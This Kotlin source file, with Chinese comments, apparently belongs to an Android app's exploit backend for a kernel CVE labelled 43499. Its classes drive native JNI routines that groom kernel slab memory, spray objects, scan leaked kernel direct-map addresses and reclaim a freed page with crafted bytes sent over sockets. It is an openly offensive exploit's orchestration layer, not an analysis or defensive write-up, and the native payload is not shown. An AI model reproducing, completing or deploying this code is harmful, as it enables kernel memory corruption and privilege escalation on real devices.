package com.ghostlock.app.backend.cve43499.owned

import com.ghostlock.app.jni.Native43499CloseResult
import com.ghostlock.app.jni.Native43499Jni
import com.ghostlock.app.jni.Native43499LandingRequest
import com.ghostlock.app.jni.Native43499LandingResult
import com.ghostlock.app.jni.Native43499PlacementRequest
import com.ghostlock.app.jni.Native43499PlacementResult

/**
 * Placement 的 Kotlin 侧公开物理参数（不含 profile / route）。
 *
 * @property placementCpu mm 塑形子进程与提交段绑定的 CPU。
 * @property measurementCpu 定位测量阶段绑定的 CPU。
 * @property timeoutNanos prepare 事务的总超时。
 * @property requiredAlignment 候选页基址额外对齐；默认整块 allocation。
 * @property scanLowerBound 泄漏地址接受窗口下界（内核直映射区间内）。
 * @property scanUpperBound 泄漏地址接受窗口上界。
 * @property scanStep 候选基址额外对齐粒度；必须整除 allocation。
 * @property scanRoundLimit 测量重试轮数上限（Native 物理上限 8）。
 */
internal data class PlacementConfig(
    val placementCpu: Int,
    val measurementCpu: Int,
    val timeoutNanos: Long,
    /* P0b：全部物理参数必填（Native 不回退默认值；缺失由调用方 fail-closed）。 */
    val pageSize: Long,
    val allocationSize: Long,
    val slabOrder: Long,
    val mmStructSize: Long,
    val mmPartials: Long,
    val prepareSlabs: Long,
    val snitchCollisions: Long,
    val pollUs: Long,
    val requiredAlignment: Long,
    val scanLowerBound: Long,
    val scanUpperBound: Long,
    val scanStep: Long,
    val scanRoundLimit: Long,
    val objectsPerSlab: Int,
    val prepareObjectCount: Int,
    val sprayObjectCount: Int,
    val preObjectCount: Int,
    val postObjectCount: Int,
    /* R2（A 决策）：原 Native STRUCT_/WIRE_ 常量改为请求字段（必填）。 */
    val identityStart: Long,
    val identityEnd: Long,
    val leakTagNibble: Long,
    val leakTagShift: Long,
    val stagingCapacity: Long,
    val maxContextEntries: Long,
    val maxObjectsPerSlab: Long,
    val maxMeasurementRounds: Long,
)

/**
 * `preparePlacement` 的具名结局。
 *
 * @note 成功只表示「Placement 物理定位事务已完成并产出 token」；不表达 route 命中。
 */
internal sealed interface PlacementPrepareOutcome {
    /** 拿到唯一 Placement owner；此后只能 landPage / cancel / close。 */
    data class Prepared(
        val owner: PlacementOwner,
        val receipt: Native43499PlacementResult,
    ) : PlacementPrepareOutcome

    /** 未产出 token；原因具名（入口拒绝/超时/系统错误/事实不一致）。 */
    data class Refused(
        val reason: String,
        val receipt: Native43499PlacementResult? = null,
    ) : PlacementPrepareOutcome
}

/**
 * `landPage` 的具名结局；token 语义在内部已按 receipt 结算。
 *
 * @note 只有 [Landed]/[ConsumedDirty] 会消费 Placement；[CleanFailure]/[NotAccepted]
 *       的 token 已恢复，本 owner 仍可重试或 close。
 */
internal sealed interface LandingOutcome {
    /** 成功落页：Placement 已消费，Page 是唯一 owner。 */
    data class Landed(
        val owner: PageOwner,
        val receipt: Native43499LandingResult,
    ) : LandingOutcome

    /** 提交前 clean failure：Placement 未被消费，token 已恢复，owner 仍可用。 */
    data class CleanFailure(
        val receipt: Native43499LandingResult,
    ) : LandingOutcome

    /** 提交后 dirty/indeterminate：Placement 已消费，Native 保留闭包到进程退出。 */
    data class ConsumedDirty(
        val receipt: Native43499LandingResult,
        val reason: String = "landing-dirty",
    ) : LandingOutcome

    /** JNI 已调用 core 但回执不完整：fail-stop，**不恢复 token**（consumed 未知）。 */
    data class ReceiptIncomplete(
        val reason: String = "landing-receipt-incomplete",
    ) : LandingOutcome

    /** JNI 前置拒绝（未调用 core）：token 已恢复。 */
    data object NotAccepted : LandingOutcome

    /** wrapper 本地拒绝（未触 Native 或参数不满足物理常量）。 */
    data class Rejected(val reason: String) : LandingOutcome
}

/**
 * `landPage` 的 Kotlin 侧参数：最终字节 + 几何由 Placement 事实补全。
 *
 * @property finalBytes Kotlin 构造的最终页面字节；长度必须等于 Native
 *   `GLK43499_PHYS_SKB_SEND_SIZE`（[Cve43499PhysicalConstants.RECLAIM_PAYLOAD_SIZE_BYTES]）。
 * @property contentGeneration Kotlin 侧生成号；Native 原样回传，不参与判定。
 * @property timeoutNanos landing 边界超时（Native 只做边界校验）。
 * @property socketSendBufferSize reclaim socket 的 SO_SNDBUF。
 * @property reclaimSendLimit reclaim `sendmsg` 次数上限。
 * @property pageAcceptRequired 1 ⇒ 启用页接受判据；0 ⇒ 本 route 无判据。
 * @property pageAcceptOffset 判据值对 candidatePageBase 的加数（legacy 0x100）。
 * @property pageAcceptBit 判据值必须置位的 bit 下标（legacy 16）。
 * @note R3a-2/B6：判据参数由 generator 依 write mode/preserve_child 计算后随请求
 *   下传；Native 在提交点前求值，失败即拒绝（Placement 不消费）。
 */
internal data class LandingConfig(
    val finalBytes: ByteArray,
    val contentGeneration: Long,
    val timeoutNanos: Long,
    val socketSendBufferSize: Long,
    val reclaimSendLimit: Long,
    val reclaimPayloadSize: Long,
    val fillByte: Long,
    val pageAcceptRequired: Long,
    val pageAcceptOffset: Long,
    val pageAcceptBit: Long,
)

/**
 * Placement 的唯一 Kotlin owner：private token + 单对象锁。
 *
 * @param facts Native 回传的只读物理事实副本（candidate_page_base / 几何 / 计数）。
 * @note 阶段：G4L-5；由 [prepare] 创建，经 [landPage] 转移给 [PageOwner]。
 * @note token 永不公开；dirty 时本对象进入 TERMINATED 语义（token 已消费、不可再用）。
 */
internal class PlacementOwner private constructor(
    private val facts: Native43499PlacementResult,
) : TokenOwner(OwnerKind.PLACEMENT) {
    /** @return Native 定位到的候选页基址（只读事实）。 */
    internal val candidatePageBase: Long get() = facts.candidatePageBase

    /** @return 候选页布局几何（只读事实）。 */
    internal val pageSizeBytes: Long get() = facts.pageSize

    /** @return 候选分配大小（只读事实）。 */
    internal val allocationSizeBytes: Long get() = facts.allocationSize

    /** @return 候选基址要求的额外对齐（只读事实）。 */
    internal val requiredAlignment: Long get() = facts.requiredAlignment

    /** @return 定位测量实际使用的轮数（只读事实）。 */
    internal val measurementRounds: Long get() = facts.measurementRounds

    /** @return 仍被 Placement 持有的 child 数量（只读事实）。 */
    internal val retainedChildCount: Long get() = facts.retainedChildCount

    /** @return 仍被 Placement 持有的描述符数量（只读事实）。 */
    internal val retainedDescriptorCount: Long get() = facts.retainedDescriptorCount

    /**
     * 消费本 Placement 并落页，产出唯一 [PageOwner]。
     *
     * @param config 最终字节与 landing 参数。
     * @return 具名结局；token 结算先于返回完成。
     * @note 入口顺序：输出 ABI（JNI 内部）→ 物理参数本地预检 → 原子取 token →
     *       JNI landPage → 按 receipt.placementConsumed 结算。
     * @note 三态结算：JNI 明确未接受才恢复 token；回执不完整一律 fail-stop（不恢复）。
     * @note 阶段：G4L-5 / Placement → Page 的唯一次转移。
     */
    internal fun landPage(config: LandingConfig): LandingOutcome = guarded {
        if (lifecycleLocked() != Lifecycle.OPEN || tokenLocked() == 0L) {
            return@guarded LandingOutcome.Rejected("placement-not-open:" + describe())
        }
        val precheck = precheckLanding(config)
        if (precheck != null) return@guarded LandingOutcome.Rejected(precheck)

        val taken = takeTokenLocked()
        val receipt = Native43499LandingResult()
        val request = Native43499LandingRequest(
            expectedPageBase = facts.candidatePageBase,
            pageSize = facts.pageSize,
            allocationSize = facts.allocationSize,
            requiredAlignment = facts.requiredAlignment,
            reclaimPayloadSize = config.reclaimPayloadSize,
            socketSendBufferSize = config.socketSendBufferSize,
            reclaimSendLimit = config.reclaimSendLimit,
            timeoutNanos = config.timeoutNanos,
            fillByte = config.fillByte,
            pageAcceptRequired = config.pageAcceptRequired,
            pageAcceptOffset = config.pageAcceptOffset,
            pageAcceptBit = config.pageAcceptBit,
        )
        /* JNI 在进入 Native 事务前深拷贝 finalBytes；本调用不保留该数组引用。 */
        val pageToken = Native43499Jni.landPage(
            taken,
            request,
            config.finalBytes,
            config.contentGeneration,
            receipt,
        )
        when (classifyHandleStatus(pageToken)) {
            NativeCallState.NOT_ACCEPTED -> {
                /* JNI 未调用 core：token 未被消费，必须恢复。 */
                return@guarded if (restoreTokenLocked(taken)) {
                    LandingOutcome.NotAccepted
                } else {
                    markTransferredLocked()
                    LandingOutcome.ConsumedDirty(receipt, "landing-not-accepted-token-lost")
                }
            }
            NativeCallState.RECEIPT_INCOMPLETE -> {
                /* fail-stop：core 可能已消费 token，不恢复、不 close、不信任 receipt。 */
                markTransferredLocked()
                return@guarded LandingOutcome.ReceiptIncomplete()
            }
            NativeCallState.ACCEPTED -> Unit
        }
        if (pageToken != 0L) {
            markTransferredLocked()
            val page = PageOwner.adopt(
                token = pageToken,
                contentGeneration = receipt.contentGeneration,
                pageBase = receipt.actualPageBase,
                placementConsumed = receipt.placementConsumed,
            )
            if (page == null) {
                /* 理论不可达：token 非零但收养失败。立刻收回 Page token，禁止泄漏。 */
                val closeReceipt = Native43499CloseResult()
                Native43499Jni.closePage(pageToken, closeReceipt)
                return@guarded LandingOutcome.ConsumedDirty(receipt, "landing-page-adopt-failed")
            }
            return@guarded LandingOutcome.Landed(page, receipt)
        }
        if (receipt.placementConsumed) {
            markTransferredLocked()
            return@guarded LandingOutcome.ConsumedDirty(
                receipt,
                "landing-" + Native43499CallStatus.name(receipt.callStatus),
            )
        }
        return@guarded if (restoreTokenLocked(taken)) {
            LandingOutcome.CleanFailure(receipt)
        } else {
            markTransferredLocked()
            LandingOutcome.ConsumedDirty(receipt, "landing-restore-failed")
        }
    }

    /**
     * 请求停止尚未进入 landing 提交段的 Placement；**不消费 token、不销毁 owner**。
     *
     * @return 具名结局；成功后本 owner 仍可 landPage 或 close。
     * @note 阶段：G4L-5。
     */
    internal fun cancel(): OwnerCancelOutcome = guarded {
        if (lifecycleLocked() != Lifecycle.OPEN || tokenLocked() == 0L) {
            return@guarded OwnerCancelOutcome.Rejected("placement-not-open:" + describe())
        }
        TokenOwner.settleCancel(this) { handle, receipt ->
            Native43499Jni.cancelPlacement(handle, receipt)
        }
    }

    /**
     * 终结本 Placement；接受后无论 released/retained 都消费 token。
     *
     * @return 具名结局；已转移/已关闭的调用是本地拒绝，不触 Native。
     * @note 阶段：G4L-5 终结。
     */
    internal override fun closeDetailed(): OwnerCloseOutcome = guarded {
        if (lifecycleLocked() != Lifecycle.OPEN || tokenLocked() == 0L) {
            return@guarded OwnerCloseOutcome.Rejected("placement-not-open:" + describe())
        }
        TokenOwner.settleClose(this) { handle, receipt: Native43499CloseResult ->
            Native43499Jni.closePlacement(handle, receipt)
        }
    }

    /**
     * 本地预检 landing 参数；Native 仍会做同一组校验，本地只为可检索 reason。
     *
     * @param config 待校验参数。
     * @return null 表示通过；否则为具名 reason。
     */
    private fun precheckLanding(config: LandingConfig): String? {
        /* P0b：全部来自请求；只校验自洽/非零，物理上限由 Native fail-closed。 */
        if (config.reclaimPayloadSize <= 0L ||
            config.finalBytes.size.toLong() != config.reclaimPayloadSize
        ) {
            return "landing-bytes-size:" + config.finalBytes.size
        }
        if (config.timeoutNanos <= 0L) return "landing-timeout-nanos"
        if (config.socketSendBufferSize <= 0L) return "landing-socket-send-buffer"
        if (config.reclaimSendLimit <= 0L) return "landing-reclaim-send-limit"
        if (config.fillByte !in 0L..0xffL) return "landing-fill-byte"
        /* R3a-2/B6：页接受判据域（0/1；启用时 bit 必须可移位；offset 允许 0）。 */
        if (config.pageAcceptRequired !in 0L..1L) return "landing-page-accept-required"
        if (config.pageAcceptRequired == 1L && config.pageAcceptBit !in 0L..63L) {
            return "landing-page-accept-bit"
        }
        return null
    }

    companion object {
        /**
         * 创建并完成一次不可拆的 Placement 定位事务。
         *
         * @param config Kotlin 侧物理参数（CPU/超时/扫描窗口）。
         * @return [PlacementPrepareOutcome.Prepared] 或具名拒绝。
         * @note 本地先校验窗口/对齐/轮数，避免把明显不合法的参数送进 Native。
         * @note 阶段：G4L-5；成功后 token 由返回的 owner 独占。
         */
        internal fun prepare(config: PlacementConfig): PlacementPrepareOutcome {
            val invalid = validate(config)
            if (invalid != null) return PlacementPrepareOutcome.Refused(invalid)
            val receipt = Native43499PlacementResult()
            val handle = Native43499Jni.preparePlacement(
                Native43499PlacementRequest(
                    pageSize = config.pageSize,
                    allocationSize = config.allocationSize,
                    requiredAlignment = config.requiredAlignment,
                    scanLowerBound = config.scanLowerBound,
                    scanUpperBound = config.scanUpperBound,
                    scanStep = config.scanStep,
                    scanRoundLimit = config.scanRoundLimit,
                    timeoutNanos = config.timeoutNanos,
                    placementCpu = config.placementCpu,
                    measurementCpu = config.measurementCpu,
                    objectsPerSlab = config.objectsPerSlab,
                    prepareObjectCount = config.prepareObjectCount,
                    sprayObjectCount = config.sprayObjectCount,
                    preObjectCount = config.preObjectCount,
                    postObjectCount = config.postObjectCount,
                    slabOrder = config.slabOrder,
                    mmStructSize = config.mmStructSize,
                    mmPartials = config.mmPartials,
                    prepareSlabs = config.prepareSlabs,
                    snitchCollisions = config.snitchCollisions,
                    pollUs = config.pollUs,
                    identityStart = config.identityStart,
                    identityEnd = config.identityEnd,
                    leakTagNibble = config.leakTagNibble,
                    leakTagShift = config.leakTagShift,
                    stagingCapacity = config.stagingCapacity,
                    maxContextEntries = config.maxContextEntries,
                    maxObjectsPerSlab = config.maxObjectsPerSlab,
                    maxMeasurementRounds = config.maxMeasurementRounds,
                ),
                receipt,
            )
            when (classifyHandleStatus(handle)) {
                NativeCallState.NOT_ACCEPTED ->
                    return PlacementPrepareOutcome.Refused("placement-not-accepted", receipt)
                NativeCallState.RECEIPT_INCOMPLETE ->
                    return PlacementPrepareOutcome.Refused("placement-receipt-incomplete", receipt)
                NativeCallState.ACCEPTED -> Unit
            }
            if (handle == 0L) {
                return PlacementPrepareOutcome.Refused(receipt.reason("preparePlacement"), receipt)
            }
            val factsMismatch = receipt.candidatePageBase == 0L ||
                receipt.pageSize != config.pageSize ||
                receipt.allocationSize != config.allocationSize ||
                receipt.requiredAlignment != config.requiredAlignment
            if (factsMismatch) {
                /* 事实与请求不一致：立即收回 token，禁止进入转移链。 */
                val closeReceipt = Native43499CloseResult()
                Native43499Jni.closePlacement(handle, closeReceipt)
                return PlacementPrepareOutcome.Refused("placement-facts-mismatch", receipt)
            }
            /* G4L-5 线性 owner：Placement token 必须安装到新 owner；否则 landPage/close
             * 都会看到 token=0（E1 真机 exposed：placement-not-open:PLACEMENT/OPEN）。
             * install 失败则立即 close 回收，绝不泄漏 token。 */
            val owner = PlacementOwner(receipt)
            if (!owner.adoptToken(handle)) {
                val closeReceipt = Native43499CloseResult()
                Native43499Jni.closePlacement(handle, closeReceipt)
                return PlacementPrepareOutcome.Refused("placement-adopt-failed", receipt)
            }
            return PlacementPrepareOutcome.Prepared(owner, receipt)
        }

        /**
         * 本地校验 PlacementConfig 的物理边界。
         *
         * @param config 待校验参数。
         * @return null 表示通过；否则为具名 reason。
         * @note 与 Native `glk43499_placement_validate` 同形，不新增策略。
         */
        private fun validate(config: PlacementConfig): String? {
            /* P0b：全部来自请求；只做自洽/非零校验，物理上限交给 Native fail-closed。 */
            if (config.placementCpu < 0 || config.measurementCpu < 0) {
                return "placement-cpu"
            }
            if (config.timeoutNanos <= 0L) return "placement-timeout-nanos"
            if (config.pageSize <= 0L || config.allocationSize <= 0L ||
                config.mmStructSize <= 0L || config.slabOrder < 0L
            ) {
                return "placement-page-geometry"
            }
            val alignment = config.requiredAlignment
            if (alignment <= 0L || (alignment and (alignment - 1L)) != 0L ||
                alignment > config.allocationSize ||
                config.allocationSize % alignment != 0L
            ) {
                return "placement-required-alignment"
            }
            val step = config.scanStep
            if (step <= 0L || (step and (step - 1L)) != 0L ||
                step > config.allocationSize || config.allocationSize % step != 0L
            ) {
                return "placement-scan-step"
            }
            if (config.scanLowerBound >= config.scanUpperBound) return "placement-scan-window"
            if (config.scanRoundLimit <= 0L) return "placement-scan-round-limit"
            if (config.objectsPerSlab <= 0 || config.prepareObjectCount <= 0 ||
                config.sprayObjectCount <= 0 || config.preObjectCount < 0 ||
                config.postObjectCount <= 0
            ) {
                return "placement-object-counts"
            }
            if (config.mmPartials <= 0L || config.prepareSlabs <= 0L ||
                config.snitchCollisions < 2L || config.pollUs < 0L
            ) {
                return "placement-slab-tuning"
            }
            /* R2（A 决策）：容量/协议字段自洽（与 Native 校验同形，不新增策略）。 */
            if (config.stagingCapacity <= 0L ||
                config.allocationSize > Long.MAX_VALUE / 2L ||
                config.allocationSize * 2L > config.stagingCapacity
            ) {
                return "placement-staging-capacity"
            }
            if (config.maxContextEntries <= 0L || config.maxObjectsPerSlab <= 0L ||
                config.maxMeasurementRounds <= 0L
            ) {
                return "placement-capacity-fields"
            }
            if (config.objectsPerSlab.toLong() > config.maxObjectsPerSlab) {
                return "placement-max-objects-per-slab"
            }
            if (config.scanRoundLimit > config.maxMeasurementRounds) {
                return "placement-max-measurement-rounds"
            }
            if (config.prepareObjectCount.toLong() > config.maxContextEntries ||
                config.sprayObjectCount.toLong() > config.maxContextEntries ||
                config.preObjectCount.toLong() > config.maxContextEntries ||
                config.postObjectCount.toLong() > config.maxContextEntries
            ) {
                return "placement-max-context-entries"
            }
            if (config.leakTagNibble !in 0L..15L ||
                config.leakTagShift !in 0L..63L
            ) {
                return "placement-leak-tag-domain"
            }
            if (config.identityEnd <= config.identityStart ||
                config.identityStart < config.scanLowerBound ||
                config.identityEnd > config.scanUpperBound
            ) {
                return "placement-identity-range"
            }
            return null
        }
    }
}
